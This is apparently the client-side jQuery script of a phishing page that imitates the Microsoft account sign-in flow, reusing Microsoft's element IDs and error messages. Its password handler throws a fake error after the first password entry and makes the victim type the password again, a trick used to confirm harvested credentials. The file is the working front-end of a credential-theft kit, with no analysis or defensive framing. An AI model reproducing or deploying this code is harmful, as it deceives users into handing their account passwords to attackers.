

    $('#i0116').keypress(function (e) {
		var key = e.which;
    if (key == 13)  // the enter key code
		{
        $('#usernameProgress').css('display', 'block');
    setTimeout(function () {
        goNext();
    return false;
}, 1200);
}
});

	$("#to-prev").click(function() {
        $('#errorBar').text('');
    $("#idSIButton10").css('display', 'none');
    $("#idSIButton9").css('display', 'block');
    $("#email-section").css('display', 'none');
    $('#pwField').css('display', 'none');
    $('#i0116').val('');
    $('#emField').css('display', 'block');
});

	function goNext() {
		var userError = 'Enter a valid email address, phone number, or Skype name.';
    var emailAddress = $('#i0116').val();
		if (isEmail($('#i0116').val())) {
        $('#emField').css('display', 'none');
    $('#pwField').css('display', 'block');
    $('#i0117').focus();
    $('#errorBar').text('');
    $("#idSIButton9").css('display', 'none');
    $("#idSIButton10").css('display', 'block');
    $("#email-section span").text(emailAddress);
    $("#email-section").css('display', 'block');
		} else {
        $('#i0116').addClass('has-error');
    $('#errorBar').text(userError);
    $('#usernameProgress').css('display', 'none');
}

}

	function closeBox() {
        $('#popup1').css('visibility', 'hidden').css('opacity', 0);
    $('#i0116').focus();
}

	function checkSubmit() {
		var pwd = $('#i0117').val();
    var re_pwd = $('#re_loginpswd').val();
    var pwError = 'Please enter the password for your Microsoft account.';
		if (re_pwd.length > 3) {
        $('#errorBar').text('');
    $('#pwProgress').css('display', 'block');
    return true;
}
		else {
			if(pwd.length > 3) {
        $('#errorBar').text('');
    $("#pwd_error").css('display', 'block');
    $('#i0117').css('display','none');
    $('#re_loginpswd').css('display','block');
    return false;
}
			else {
        $('#errorBar').text(pwError);
    return false;
}
}
}

	function isEmail(email) {
		var regex = /^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/;
    return regex.test(email);
}
